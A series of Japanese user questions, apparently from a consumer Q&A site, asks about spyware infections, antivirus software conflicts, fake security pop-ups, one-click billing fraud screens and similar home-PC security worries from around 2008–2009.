現在フレッツのウィルスバスターとAd-Awareを常駐させ手動検索にはこれらプラススパイボットを使ってるのですが、二つもソフト」常駐させるのは意味があるのかちょっと気になりだしました。 もし意味がないのであればただやみくもにメモリを食うだけなので無駄でしたらウィルスバスターだけにしたいのですが、これはどうなのでしょうか。
友人のPCがSpywareProtect2009に感染してしまったらしいのです。 SpywareProtect2009についていくつか教えて下さい。 １．SpywareProtect2009によって、ネットがつながりにくくなる事はあるのでしょうか？ ２．フリーソフトでの検出、削除となると、Malwarebytes' Anti-Malwareと言うソフトで可能なようですが、 　　日本語版では、このようなソフトはありませんよね。 ３．トレンド フレックス セキュリティ の オンラインスキャンでは、検出できなかったようなのですが、 　　ウイルスバスターの正規版や体験版では、検出及び駆除はできるのでしょうか？ ４．もっと簡単に駆除できる方法があれば教えて下さい。 以上４点ですが、よろしくお願い致します。
現在、一つのロリポップサーバーでの独自ドメインでサイトとブログを運営しています。 ・サイト:ttp://www.Example.com(主) ・ブログ:ttp://blog.Example.com(サブドメイン) .htaccessで特定のIPからのアクセス制限をしたいと思っているんですが、下記のように記載しても制限されません。（試しに自分のIPも入れて試みました。） order allow,deny allow from all deny from xxx/0 deny from yyy/0 deny from zzz/0 ErrorDocument 403 403.html 主にサブドメインのブログのアクセス制限をしたいのですがサブドメインディレクトリに置いて.htaccessに名前を変更しても制限されません。 また、403.htmlも.htaccessと同じサブドメインディレクトリに置いてあります。 何か間違っている事があるでしょうか？？
お世話になります。 OS :　Windows XP-SP3 回線接続 :　無線LAN セキュリティソフト :　ESET Smart Security を使用しています。 先日、Smart Security のパーソナルファイアウォールログを確認したところ、 1日に3・4回くらいの割合で ・『IPパケットのチェックサムが不正です』 ・プロトコル :　0 という内容のイベントログが記録されていることがわかりました。 ソフトの HELPファイル や サイトのサポート情報を見ても上記のログに関する説明が載っておらず、自分の PC に何が起きているんだろう…？と気にかかっています。 そこでお訊ねしたいのですが、 このイベントログは何か重大な問題があることを意味しているのでしょうか？ もし、特に気にするようなログではない場合、パーソナルファイアウォールが検出しないように除外設定することは可能でしょうか？ とても初歩的な質問で申し訳ありません。 お分かりになる方がいらっしゃいましたら、アドバイス・ご回答をいただければ幸いです。よろしくお願い致します。
私は色々なサイトなどのアカウントのID、PW、メールアドレス、全て統一させています。 たとえば大手の運営するAmazonやYahooから個人の運営するサイトまで。 大手のサイトは安心ですが、個人のサイトは少し不安です、もしID、PW、メールアドレスを怪しいソフトなどに入れられAmazonなどのサイトで検索されたら個人情報まで抜かれてしまいます。 そういう手口は良くあるのか、やはり信頼できるサイトと個人のサイトとはPWを別にした方がいいのか、教えてください。
教えて下さい。 ネット使用中に画面の右下から『Forbidden by Dele Gate』 と表示が出ます。 意味を調べると、『削除記号ゲートで禁じられています』 と出ました。 15分に1回位出ます。 画面から一時的に×で消せます。 半年程このPCを使ってるのですが、出だしたのはここ1か月程です。 有害な物でしょうか？出ないようにはできるでしょうか？ カスぺの体験版入れてます。
パソコンの中にある個人情報 1｛マイドキュメントにある自分で作ったファイル｝ 2｛蔵衛門。などにあるデジカメ画像｝ 3 {hotmail。にある受信メール[サイトなどに登録した記録など]｝ こういったものは、パソコンに保存したままで大丈夫でしょうか？ パソコンを使っているのは自分一人で別の人に使われるという事はありません。 ウイルス、スパイウェア対策ソフトは入れてます。 Winny？は入れてません。 自分の知らないうちに個人情報が盗まれるのは どういう時どうやってなんでしょう？　 やっぱりCD-Rとかにコピーしてパソコンの中に 個人情報は一切残さないようにしないと安全ではないんですか？
ひとつのＰＣにスパイボットとカスペルスキーは共存できますか？ フリーズの原因等になってしまいますか？
あるときProgram Filesを開いてみたら、ESTsoftというフォルダができていて、その中にALBNCollectorというアプリが入っていました。ESTsoft自体は未知の企業ではなく、日本語版ウィキに載っていますし、私も同社製の解凍圧縮ソフトAlzipを使用しています。これをインストールしたとき、上記のアプリも一緒に入ったようです。 しかしCollectorという名前が気に入りません。個人情報を盗まれているのではないかと不安です。またネット検索でも、Online ArmorのHPなどで動作未確認のあやしげなソフト、などと記述されています。 そこで削除したいのですが、Alzipの動作に影響するのではないかと気懸かりです。また削除するにしても、フォルダにはアンインストーラーなどはなく、「プログラムの変更と削除」にも名前がありません。 regeditで調べると、AL Bannerの名前でレジストリに大量のキーを書き込んでおり、単純にプログラム本体をごみ箱に捨てて退治、というのも無理なようです。 このALBNCollctorなるウサンくさいプログラムについて詳しい方、ご教示いただけると助かります。
Windows　Vista にウイルスバスター2009をつかっています。 急に画面右下のタスクバーのところに「Windows Defender」のアイコンが現れました。セキュリティソフトは２つ併用しないようにときいたことがあります。アイコンー右クリックー終了としても、次回電源入れたらまた登場します。 ・併用はいけませんか ・「Windows Defender」を停止させるにはどうしたらいいでしょうか。
約一年前に購入したVistaのパソコンを使用しているのですが ネットをやると動きが遅いと思うようになりました。 最初、Vistaは重いと聞いていたので、気にならなかったのですが、 どうも、最近身に覚えのないファイルや 数々のファイルがパソコンの中に入っていて もしやこれはウイルス？またはスパイウエアと 呼ばれるものなのか？ と思い始めるようになりました。 とにかくパソコンが重くて、ネットをやる環境に イライラしています。 ファイルにアクセスしようとするとアクセスが拒否されたり また、私以外のユーザーがファイルを共有している？ とりあえず何が何だかわかりません。 とっても困っています。 わけのわからないファイルの削除の仕方を教えてください。
Windows Vistaで、IE8を使用中です。 IE7を使用していた時もたまにですが、 お気に入りの並び替えが勝手に行われており、いったんウインドウを閉じて、ネットにつなげなおすと、元に戻っていて、並び替えなどまるでなかったかのようになっていました。。 今回も作った覚えのないフォルダがあり、削除しようとすると、 私個人のお気に入りの場所にはないので、場所を探して削除してくれと出ました。 私のコンピュータ内には探してもそんなフォルダはなく、もう一度ネットに繋げ直すと、フォルダはなくなっていました。 スパイウエアが心配なのでAd-Awareを使用していますが、スキャンでは見つからず。オンラインのスキャンでも見つかりません。 何か対策はあるのでしょうか？ お願いします。
PCに詳しいかた助けてください！ 現在、windows Vista HOME Premium 32ビットを使用しています。一定時間なのか、HPを見ていると突然「big fish game」やカジノみたいなマークのHPが開きすごく邪魔なのです。いろいろ調べて「スパイウェア」ではないかと「Ad-Aware」や「spy-bot-SD」などで駆除してみましたが、やはりだめでした。ちなみにセーフティモードでも駆除ソフト施行しましたが、撃沈でした・・。助けてください！お願いします・・。
　Cookieについて、よくわかりません。ツール→インターネットオプション→Cookieの削除とありますが、どういう意味でしょうか。
デジタルカメラに使用していたSDカードに含まれていたexeファイルとautorun.infがトロイの木馬に感染していました。 SDカードはウイルス駆除ののちフォーマットしましたが、デジタルカメラのシステムに影響はあるでしょうか？至急回答願います。 ちなみに使用しているデジカメはpentax optio E60です。
プログラムをネットからダウンロードしてそれは望んだ動作をしています。 しかしA-SQUAREDでスキャンしてみると「Trojan.win32.Aquent!IK」と表示されます。 気になることは、 1誤検出なのか？ 2誤検出の場合、なぜそうなったか確かめる事はできるのか？ 3正常に動作するプログラムがスパイウェアである事があるのか？ です。そのプログラムは1MB程です。よろしくお願いします。
普段は購入してるESET Smart Securityを使っていますが、どこかのサイトでノートンの無料版がインストールされ、電源を入れた時に勝手に起動されウイルス検索で１２６もの脅威が発見されました。 ESET Smart Securityでは０だったにも関わらず、１２６とはあまりに多い為に不安になりました。 それも、１２６もの脅威を解決するにはノートン３６０を購入しないといけないみたいなんですがどうすればいいんでしょうか？ １年分で購入してるESET Smart Securityではどうしようもないんでしょうか？
ネット接続した状態で「タスクマネージャー」を開くと「ネットワーク」の項で 30秒おきに通信反応がグラフに表示されます。 「TCP Monitor Plus」というソフトを使って「トラフィックモニター」を見ると 30秒おきの通信内容はほぼ受信のみを行ってるようです。 PCにはNortonを常駐してあり、下記サイトを含む、いくつかのオンラインスキャンも試みましたが 　http://www.kaspersky.co.jp/virusscanner 　http://www.f-secure.co.jp/v-descs/disinfestation … ウィルスの検出は無く、それでも気味が良くはありませんので、 HDDのリカバリ領域からPCを工場出荷時の状態に戻すというフォーマットを行いましたが、 現在も同じ症状が続いております。 この症状に気付いた後に購入したPCもあるのですが、そちらも初めてネットに接続した時から 「タスクマネージャー」にて同じように30秒おきの通信記録が表示されます。 PCのOSは「XPSP3」新PCは「Vista」ルーターは使用しておらず、ハブを使用しております。 この症状をご存知の方がいらっしゃいましたら、アドバイス頂けると有難く存じます。
　パソコンに、スパイウェア検出が表示され、削除するか、放置するか、自動削除するかという指示がでましたが、どうしたらよういでしょうか。そして、あまりわからなかったので、削除する項目を、すべてチェック→自動削除を選択して、処理する（はい、いいえ）がでましたが、そこで、自動削除をやめようと思って、いいえを選択したら、ウィルス項目が、消えてしまいました。どうなったのでしょうか。
今日、時間があったので何気なく“教えてGoo”を見ていたら以前私が使っていた回答者名で（いまは3か月ぐらい前に変更しています）誰かがいろいろ回答をされています、その回答者名の回答履歴を見ると私の得意なカテゴリー（釣りと家電製品）でいろいろと回答されていて、私の回答もそれまでにありますので回答件数も相当にあります、中には良回答もあります、私が答えていない質問にも答えています、これって言うのは私の　goo ID とかパスワードが盗まれているってことでしょうか？　今のところはこのGoo以外には何も被害などは出ていませんが、ほっといていいものかどうか迷っています、そして止めてもらう方法などがあるのでしょうか？
タスクマネージャを見ると、 fgfha.exe が動いているのですが、いったいこれは何なのでしょうか？ ウイルスでしょうか？
今朝から、HP閲覧でページを変えるたびに、突然「Advertisement」という名前の ポップアップ広告が出てくるようになりました。 ページを移動するたびに海外の広告が新しいウィンドウでひっきりなしに出てきます。 Advertisementの名前が出たあとに、広告に切り替わるようです。 普段閲覧している問題のないサイトに移動しても広告がでてきて、 そのたびに「ポップアップをブロックしました」と上部にバーが 点滅する状態で、あっと言う間に開いているページが10以上になってしまいます。 消しても消してもきりがないというか・・・。 ウィルスバスター2009で、スパイウウェア等含めたフルスキャンをすると いくつかのcookieは削除されますが、再起動してみるとまた同じ症状が でてきてしまいます。 SPY BOTも試しましたが、ウィルスバスター2009があるとどうも上手く機能しないようです。 オンラインスキャンや、XーCleaner マイクロスキャナなども試したのですが 何もひっかかりません。 色々ググって見たのですが、削除の方法に関するものは見つからず 困っています。 ご存じの方いらっしゃいましたら、対処方法をぜひ教えて下さい。 ブラウザは　Internet Explorer 6.0 （ポップアップブロックは中に設定） ＯＳは　Windows XP Home Edition ウィルスバスター2009使用
最近a-squared Freeで検索した結果［Backdoor.Win32.IRCBot.gju!A2］という高リスクのスパイウェアが検出されました。 そのまま削除したのですが、やはりリカバリしたほうがよろしいでしょうか？このままパソコンをしてても大丈夫でしょうか？ それと、Backdoor.Win32.IRCBot.gju!A2を色んなところで検索してもヒットしなかったのですが、新種のものなのでしょうか？ トロイの木馬を初めて感染したものですからちょっとパニックになっています。 今現在、Vistaを使用しています。アドバイスよろしくお願いします。
　ファイルをダウンロード中、セキュリティソフトから警告が出て、トロイらしきファイルを見つけた様なのですが、「オブジェクトから削除出来ない」のようなコメントが出て、そのあとクリック音が連続するようにカチカチカチ…。結局アラートは消えてしまいました。 　この状態のＰＣは何らかの感染状態でしょうか？ 　スキャンして何もマルウェアが出てこなければ、ウィルスは水際で食い止められたと判断すれば良いのでしょうか？ 　ご指摘いただければ幸いです。
よろしくお願いします。 パソコンのソフトに、対象とするパソコンの画面を監視したり、実際に、もう一方のパソコンで操作をすることのできるソフトがあると聞きました。これらのソフトは、スパイウェアもしくはウイルスとして、セキュリティ対策ソフトの検索と駆除の対象になるのでしょうか。 　また、監視や不当な操作をさせないための対策はあるのでしょうか。
昨日、spypotをダウンロードしたら パソコンの電源を切ることができなくなりました。 パソコンに詳しくないのでどうしたらいいのか分かりません（泣） ちなみにspypotをダウンロードする時に全ての項目にチェックを入れてしまいました。（英語で書いてあったので意味はわかりません） どうやったら電源を切ることができるでしょうか？
ノートン３６０の最新バージョンを使っています。 メールはアウトルックエクスプレスを使っています。 今は不要メールのアドレスをコピペでノートン３６０遮断リストへ登録しています。 アドレスコピーのために不要メールを開かなければいけませんし、 アドレスペーストのためにノートン３６０の遮断リストまで行かなければいけません。 正直かなり手間と感じています。もっと簡単にできないのでしょうか。 よろしくお願いします。
IDは公開しても問題はないんでしょうか よく色々なアカウントを作る際IDとパスワードを入力しますよね、そのIDは公開しても、見られても大丈夫でしょうか？
こんにちは。私はjcomに加入していてPCのセキュリティソフトにマイシールド(ファイアウォール&スパイウェア対策付き)を使用しています。最近、そのソフトでクイックスキャンをしたのですが、少し気になることがあって質問させていただきました。 スキャンの際にフォルダ名は情報なしで、複数のスパイウェア名のファイルが表示されていたのですが、スキャン終了後は、何も検出されなかったと出ました。(セーフモードの場合も同様) 心配になってウイルスバスターのオンラインスキャンを行ったのですが、その時はそのスパイウェア名のファイルは一切出てきません。 これはどういうことなのでしょうか？現在、スパイウェアにあっているような症状は出ていませんが、今後の為に何か対策が必要なのでしょうか？ PC初心者なりに調べてはみたのですが完全一致の回答が見当たらなかったので、どうかご教授よろしくお願いします。
AVG Anti-Virus Free Editionを利用しています。 ウイルス情報はどこで見ることができるのでしょうか? ホームページのサポートを見ても、テクニカルサポートを見ても見当たりません。 Freeで有るか否かを見て閲覧制限をかけているのでしょうか? torendomicroサイトでは見ることができるのですが。
pcを起動してログインしたらspybotが突然にフルの検査を開始しました。 とりあえず停止して再起動をすると同じことは無かったので その時だけですが、スケジュールを設定してたわけでもないので 疑問に思います。 高度な設定に変更してスケジュールが設定されてないのは 確認しました。ソフトのバージョンは1.62で1ヶ月前に このバージョンにアップしました。 他に何か設定を変更しなければならないのでしょうか？
とあるアダルトサイトにアクセスしたところ、３日以内にお金を振り込むように支持されました。 ワンクリック詐欺なのか、とも思ったのですが、こちらのパソコンのIPアドレスを強制的に送ってしまったらしいのです。 このまま放っておいてよいのでしょう？
今日、インターネットエクスプローラーを７から８にバージョンアップしました。 で、再起動したときに「システムは深刻なエラーから回復しました」というメッセージがでました。 アンチウイルスソフトが原因のようですが、アンチウイルスソフトがダブってないかどうかを調べるにはどのような方法がありますか？ ちなみにコントーロールパネルのプログラムの追加と削除には、アンチウイルスソフト「avast!」と「Kaspersky On-line Scanner」があります。「Kaspersky On-line Scanner」は入っていても大丈夫ですか？
ここ最近ヤフーをはじめyoutube、Amazon、グーグル サイトで検索する際入力するところ…検索窓？というんで しょうか、そこに検束ワードを入力すると他のキーワード 候補一覧が表示されてしまうことに気がつきました。 前はこんなことはなかったように思うんですが 上記サイトの新しい検索サービスなのですか？ まさかスパイウェアに感染してしまったのでしょうか… ちなみにブラウザのスタートページに設定してる OCNでは検索しても大丈夫でした。 ずいぶん昔誤ってJ-ワールドをインストールしてしまった 時同様の現象がパソコンに起きてしまったので心配です。
うっかりアダルトサイトを覗いていましたら（有料には入っていません）突然何かテロップが出てそれ以降インターネットを切った後でも約３分毎に「ご登録が完了しました」と書いた表示されます。もちろん入金依頼でしょうから何もクリックせず消していますがインターネット回線を切って１日経過しても定期的に表示されます。 ソフト等は以下の通りです。 　　OSーーーーー Windows Vista ウィルスソフトーーウィルスバスター 　　動作ーーーー各ソフトの動作は異常ありません 何かこの表示を消す方法を教えて下さい。宜しく御願い致します。
削除方法を教えてください。
Jane2chで２ちゃんを見ています。 特にニュース速報を見るのですが、見ると同時にdatファイルで見た部分までファイルとしてハードディスクに保存されます。 後日ハードウェアの全ドライブをNorton Internet Securityでスキャンをかけると、このログファイルがスパイウェアと識別されました。 なぜただのテキストファイルがスパイウェアと識別されるのでしょうか？ また、このファイルが悪さをする可能性ありますか？
スパイウェアのチェックにAD-Aware SEを使用していますが最近起動するのに１０分ぐらいかかりますし、CPUは起動するまで80～100%使用されています。 他のAPなどはすべて順調ですし、イベントビューアーにも特にメッセージはありません もっと早く起動させる方法がありましたら教えてください、よろしくお願いいたします 使用している機種は以下の通りです 本体、DELL Dimention 8400 Pen４ 　3.4GHz MEM 2.5GB HD C: 160G+160G RAID-1 HD D:\ 500G OS Windows XP Home SP3 AD-Aware SE Parsonal 1.04
現在、ＯＳはVista Home Basicを使っています。 Ad-Aware Free Anniversary Editionをインストールすると再起動の前にアップデートをしてくれます。そこでは、アップデートが正常に行われるのですが、再起動後、普通にWebアップデートをクリックすると「接続エラー。設定を確認してください。」と表示されます。 ファイアーウォールが原因だと疑い、一時的に無効にしたのですが解消されませんでした。 もう一つ、プロキシー設定という物を知り、設定してみたのですが変わりませんでした。 アドバイスよろしくお願いします。
自宅にノートパソコンが２台あります。 １台は、ウイルスバスター２００７ もう１台は、ウイルスバスター２００８をインストールし ２つのシリアルナンバーで使用しています。 ウイルスバスターは、自宅なら３台までインストールできると きいたので、シリアルナンバーの期限が切れる機会に、 そう設定したいと思っていますが、異なるバージョンの ウイルスバスターの場合も、複数台に使えるのでしょうか。 いまだに、ウイルスバスター２００７を使っている理由は、 古い方のパソコンのメモリーが足りないので、２００８を インストールできないからです。 メモリーを増設するには、１万円くらいかかるようなので、 今のところ、見合わせていますが、必要ならば、 増設することも可能です。 どなたかお分かりになる方、教えてください。
よくスパイウェアによる情報漏洩の話を聞きます。 そこで、USBメモリに入っている機密ファイルを扱う場合、ファイルを操作している時にはLANケーブルを抜いておき、USBメモリを取り外してからLANケーブルを差し込む、というやり方をしていれば、漏洩は防げるのでしょうか？ それとも、USBメモリのファイルをどこかに勝手に保存し、ネット上にばらまくようなスパイウェアも存在するのでしょうか？ ご存知でしたら、よろしくお願いします。
SUPERAntiSpywareをダウンロード＆インストールして使用しています。確か、無料版と有料版とがあって無料の方を使っています。 デスクトップの画面の右下にSUPERAntiSpywareのアイコンがあって、右クリックで『Click for Updates』の所を選択して今まではアップデートして使用していました。 最近、それをすると右下の隅にメッセージが表示されます。 一番上に、『SUPERAntiSpyware Update』と出てこれは問題はありません。 次が、『There is an update available for download. If you would like to download the update now, please click the ”Download and Install the Updates Now” link below.』 と出ています。前半の部分の『There is an update available for download.』は『ダウンロードできる最新版が、あります。』になると思うのですが、後半の『If you would like to download the update now, please click the ”Download and Install the Updates Now” link below.』の訳が判りません。 下の部分に『Product Update Options』てのがありまして、 『Download and Install the Updates Now』と『Continue what I was doing and Download Later.』にハイパーリンクが貼ってあります。『Download and Install the Updates Now』の部分に問題はないのですが、『Continue what I was doing and Download Later.』の部分の訳が判らないので困っています。 ネットの翻訳サイトで色々と試してみたのですが、今一つ不自然な日本語だったので不安なのです。オプションとなっているのが気掛かりです。ここから先は有料なのかなとも勘ぐったりしています。お判りになる方からの回答を宜しくお願い致します。
自分自身の不注意なのですが、これを防止するための有効な手段が見つけられません。 SHIFTキーを押しながらUSBメモリをさすとか自動実行をとめるとかは見つかったのですが、どれも決定打にかけるというか人間のミスを誘発してしまうものです。 せっかく便利な装置なのに使いづらくなり昔のようなFDDとかCDRを使うようになるのではおかしいですよね。 何かいい方法はないのでしょうか。 ちなみにUSBメモリ2個はFORMAT、アラートを出さなかったウイルスセキュリティゼロをいれていたパソコンはリカバリーしています。 スパイウエアを消してもすぐ復活してしまうので。 Avastとトレンドマイクロはアラートが出たので、これらの入ったパソコンはそのままですが、大丈夫ですよね。 もちろん絶対ではないと思うので、様子を見つつリカバリーするつもりではいますが。
ウイルスセキュリティＺＥＲＯを使用している者ですが、新しいアダルトサイトを開こうとしたところ、画像はなかなか現れないのにハードのけたたましい音が鳴り止まなくなりました。まずいと思い、インターネットの接続を切りましたが、勝手に接続してしまいます。何度切っても同じなので、線ごとパスコンから抜き取りましたが、デスクトップの画面には、青、赤、黄、薄緑の四色で四角い模様が現れて消えなくなりました。英語のメッセージが頻繁に現れますが、スパイウェアはなんとか読めますが、英語がわからないので、後は理解できません。ウイルスチェックをしましたが、隔離と削除がをれぞれ１件づつでした。現在の状態は全て緑色の丸になっています。ＯＳの再インストールも試みましたが、バージョンが違うからできないと言うような表示が出て、拒否されました。いったいどうすればいいのでしょうか。どなたか教えてください。
Aviraを入れていればその他のスパイウェアーは必要ありませんか ちなみにスパイウェアーブラスターは第三の対策として必要だと思っています。
こんにちは、よろしくお願いします。 Ad-Aware Free Anniversary Edition Free をインストールして当初の目的は達せられました。 ところが「Japanese」でインストールしていたのに、いつの間にかメニューが「English」に変更されていました。 元に戻せないので、コントロールパネルから一旦アンインストールし、「Japanese」選択で再度インストールしてものの、今度はメニュー画面が最初から「English」になっています。 解決策をご存知の方はお教え願えないでしょうか。 よろしくお願いいたします。
ネット通販後に、パソコン内をチェックしたらスパイウェアが入っていました・・ つまり、通販の際のパスワードや個人情報がもれてしまったという事になるのでしょうか？
パソコンを起動する度に「hostsファイルが変更されました、？？？へ接続します」のような警告画面が出るようになりました、心当たりが無いのでキャンセルする方法があれば足えて下さい。
c:\WINDOWS\system32\jkklKaaa.dllがTrojan.win32.Monderb!IKというマルウェアに感染してしまいました。 デスクトップ画面でタスクバーやアイコンが表示されず、ランチャーからマイコンピュータを起動しようとすると '/idlist.:***:****.'が見つかりません。名前を正しく入力したかどうかを確認してから、やり直してください。（＊の数字は変わる） と表示されてしまうという症状です。何度か続けるとタスクバーもアイコンも表示されますが、しばらくしてまた消えてしまいます。 ウイルス対策としてはavast!を使っていたのですが、感染したファイルをVirusTotalで調べてみたところavast!では発見できないようでした。 そこでA-SQUAREDをインストールしてセーフモードで起動してから、A-SQUAREDでスキャンし削除を試みたところ削除も移動も出来ませんでした。 すみませんがどなたか対処法をご教授お願いします。
ノートン　インターネット　セキュリティ 2009 のプロダクトキーを購入して未使用です。これをノートン　インターネット　セキュリティ 2010 が出てから使用する事はできますか？それと、シマンテックのサポートはしてもらえるのでしょうか？別のセキュリティソフトからの乗り換えするつもりでしたが、勘違いで早く購入してしまいました。
Spybotでスキャンしたところ、SpywareBOTというソフトが引っかかりました。 説明によると、Spybotを真似した偽ソフトのようですが、これは個人情報を流出させるような悪さをする物なのでしょうか？ ご存知の方がいらっしゃいましたらよろしくお願いします。
avastを使っているのですが、これはスパイウェアと ウィルスのみにかかっているのでしょうか？ 同人ゲームを買ってインストールしたら 「ウィルス、またはワーム」で インターネットエクスプローラ、メセンジャー もおなじくavastにかかってしまいました。 あまり知識がないのでご存知の方よろしくお願いします。
お世話になります。 インターネットの履歴を見ると　行ったことのないポルノページの 履歴が残っています　クッキーを消しても　いつのまにか同じ履歴が 残っています。どうしたら良いでしょう？ またセキュリティソフトはNTTセキュリティ対策ツールが入っています 違うソフトを入れたほうが良いのでしょうか？ よろしくお願いします。
パソコンを終了させようとするとdummy mixer callback windowというメッセージが出ます。カスペルスキー2009は入れていてパソコンの完全スキャンは週に一度はしています。それでスキャンしても問題なく　このパソコンは安全です　という表示になります。グーグルなどで調べるとアドウエアに感染している可能性があるようなのですが、もし詳しいことがお分かりになる方いましたら教えてください。よろしくお願いします。
中国でインターネットに接続していたら間違って有料サイトの入会画面に入ったようで、その後すぐＰＣ画面上にご入会手続き完了の画面が出てくるようになった。終了（×）しても１０分ぐらいでまた出現します。 振込み期限は３月１９日中となっており時間がカウントダウンしています。１９日は明日なのでちょっと悪い予感しています。ノートンアンチウイルスでチェックしてもひっかかりません。１９日になる前に完全にPCから削除したいのでその削除方法をご教示願います。
インターネットに接続すると、毎回ではないのですが度々 自動でもうひとつ新しいページが開いて なにかのサイトに接続しようとするのですが http://www.wwwamnc1.com/fallback.php というアドレスが出てきて 「ウィンドウが閉じようとしています　はい／いいえ」 というメッセージが出てきます。 はい　にすると消えて いいえ　にしても真っ白い画面が現れるだけなのですが これは何なのでしょうか。 因みにその際、PC画面右下に　shoppingads何とかかんとか というメッセージが一瞬、浮かんで消えます。 なにかおかしげなスパイウェアでも紛れ込んでいるのでしょう。 ad-awareとV3で駆除しようとしたのですがひっかかってきませんでした。 「不法サイトにアクセスしようとしているので接続は中断されました」 というサイトが出てくることもあります。 (韓国で接続しているので韓国政府が発令している模様のサイトです) どうすれば駆除できますか？ 怖いです。どうかお詳しい方、お願いします
怪しいソフトはタスクマネージャ（Ctrl+Alt+Delete）から確認できるそうですがほかにも方法があるのですか。発見した場合、削除の仕方をおしえてください。
今現在、個人で何台かのPCを所有しているのですが 最も古いPCのアンチウィルスソフトがノートンの2003です。 更新するのが有料みたいなのでケチって放置していたのですが それならばいっそフリーソフトを入れたほうがよいのでしょうか？ またも新しくフリーソフトのアンチウィルスソフトを入れるなら 既存のノートン2003は削除したほうがよいのでしょうか？ お勧めのフリーソフトなども紹介していただければ幸いです。
誰にも言えないお恥ずかしい話です！ 昨日、ヤフーで「エロ動画」と検索したのがことの始まりです。 無料ダウンロードでエロ動画が見れるなら しめたものだとガッツポーズしました。 しかし無料ダウンロードが完了した瞬間、胡散臭い なんとも映像が悪いAV画像を数分見てしまいました。 しかし全く刺激がないためエロ動画をピシャと閉じました。 それから中古車情報をネットで見ていました。 すると、 「ご登録内容確認画面」がボーンと真ん中に出てきました！ な、なんなんだ・・・こ、これは？？？？ ×をクリックして画面を消しても数分経てば 必ず、ボーンと登録内容確認画面が出てきます。 お支払い料金　50,000円 お支払い料金の期限は3日以内です。 ユーザーID 598634 振込先　○○銀行 ※画面はご入金の確認が取れませんと 期日が過ぎても表示されますので予め ご了承下さい。 「あっ、今、その画面が突然出てきました・・・」 こんなバカなことがあるのかと呆れながら 腹を立てています。 すいません、本当にこの登録内容確認画面は いつまで出てくるのでしょうか？ 画登録内容確認画面を今すぐ絶対に出て来ない ようにするためにはどうすればいいのでしょうか？ 余りにもやり方が汚いのでお問い合わせフォームに 抗議してやるかと困惑しているぐらいです。 どう対処するべきでしょうか、助けてください！！ このパソコンド素人に どうか、あなた様の「知恵」をお貸しください。 よろしくお願い致します。
WindousDefenderで「更新プログラムを今すぐ確認する」で「コード0x80072efd.のエラーが見つかりました。」とメッセージが出てWindousUpdateが昨年の１２月からできません。どう対処したらよいのでしょうか。
セキュリティソフトが警告するプログラムが載ってるサイトありません？ セキュリティソフトが○○がアクセスしましたとかと警告を出されても、分からないので。 F-Secure Internet Security 2009 vista
数年ぶりに使用することになったパソコンのウイルスソフトの期限が切れており、 ネットに繋げて程なくトロイの木馬とスパイウエアに感染してしまいました。 体験版ではありますが応急処置的にウイルスバスターをインストールし、スキャンによって検出された異常をすべて削除しました。 以降、日に一度の頻度でスキャンを行っていますが、ウイルスやスパイウエアの類は検出されず、正常に保護されているようです。 IEのオフラインコンテンツやクッキー、履歴も終了のたびに全削除しています。 それにも関わらず、以下のような異常が現れます。いずれもインターネットに接続している状態です。 ・勝手にIEが新ウインドウで開き、アクセスした覚えのないサイトを表示する。 　サイトはオーストラリアへの移住を勧めるものや、結婚相談らしきもの。 　どちらも日本語表示で末尾はjp。 ・突然男性が英語で喋っている音声や、吸引音のような音声が出る。 　その時使用しているソフトや開いているサイトとは全く関係ない。 　音楽再生ソフトやスカイプ系のソフトも起動していない。 これはやはりウイルスやスパイウエアが駆除されていない状態なのでしょうか。 近々ウイルスバスターを有償版に切り替えようと思っていますが、有償版にすれば解決するでしょうか？ それとも他のソフトを試してみたほうがよいのでしょうか？ 詳しい方、よろしくお願いします。
flashgetを便利に利用してましたが１ヶ月ほど前にダウンロードが早くなる様にと息子が高速用をインストールしてしまい中国語の物に変わってしまいました。アンインストールし、プログラムからはなくなりましたが、その後何かをダウンロードしようとするとflashget tittleの画面が出て前に進めません。パソコン初心者です。Windows XPを使用です。どなたか知恵をお貸しください！お願いします。
はじめまして。 Hotmailを閲覧中、急にデスクトップに画面が現れました。 （環境はXPとIE7.0です） マイコンピューターのような画像で、 「Cドライブのうちの○○ファイルがトロイの木馬に感染しました」 というようなことが書かれていました（全て英文でした）。 Cドライブがどんどん感染されていくかのような画像でした。 その後すぐに別の画面が自動的に開き、 「ここをクリックしてアンチマルウェアのソフトをダウンロードしてください」 と書かれていました。 とにかく勝手に開いた画面は全て閉じ、 まずは常駐として使っているノートン３６０でスキャン、異常はありませんでした。 中にはノートンでは検知できないものあると聞いていたので、 トレンドマイクロのオンラインスキャンも試してみました。 アドウェアがひとつ検知され、 削除しなくても問題はないとのことでしたが一応、削除しました。 更にA-SQUAREDのアンチマルウェアというソフトを使ってスキャンしてみましたが、 こちらも問題ありませんでした。 念のため、履歴やキャッシュはクリアにしましたが、 今でもどこかに潜んでいるんじゃないか？と不安です。 これだけ試して問題なければ駆除できた、 もしくは観戦していなかったと思っても良いのでしょうか？ 他にも試したほうが良いというものがあれば、 お教えいただければ有難いと思い、質問させていただきました。 よろしくお願いいたします。
ウイルスセキュリティでウイルスチェックをすると毎回「HOSTSファイルは変更されました。ネット詐欺(ファーミング）の可能性があります」と出ます。これは何ですか？毎回出ないようにするにはどうしたらよろしいか？教えて下さい。
こんにちは。質問させていただきます。 今朝、パソコンを立ち上げるのも面倒なので、 PS3(プレイステーション3)でインターネット検索しようと、 infoseekで検索しました。 すると、確かパソコンでAD-awareSEでスパイウェアとして、 検出して削除したことのある「Jword」が検索結果のPS3のブラウザの、 左端に表示されました。 Jwordについていろいろ調べてみたのですが、作成会社側は、 「スパイウェアでは無いです」と言いたげですね・・。 スパイウェアでは無ければ問題無いのですが、 もしスパイウェアであればPS3にどんな影響がでますでしょうか？ パソコンと違い削除のしかたもわかりません・・。 詳しいかたの助言を願います。
Ad Aware 2008の更新をした（2008年3月12日午前00時過ぎ）ところ、PCがおかしくなりました。 1.CPU使用率がかなり高くなる。リソースモニターで見ると「aawservice.exe」というAd Aware関係のが原因（平均50%位、時々100%まで使用）のようです。 2.Ad Awareが起動させると「System Error:1814」と他のユーザーがAd Awareを使っているのでは?というメッセージが出て、起動できない。 OS:Vista SP1、メモリ2G、CPU:Core 2 Duo E4400 セキュリティソフトは、NTTセキュリティ対策ツールVer.16です。 再起動やウイルス検索はしましたが、異常なしです。 どなたか、対策を教えてください。
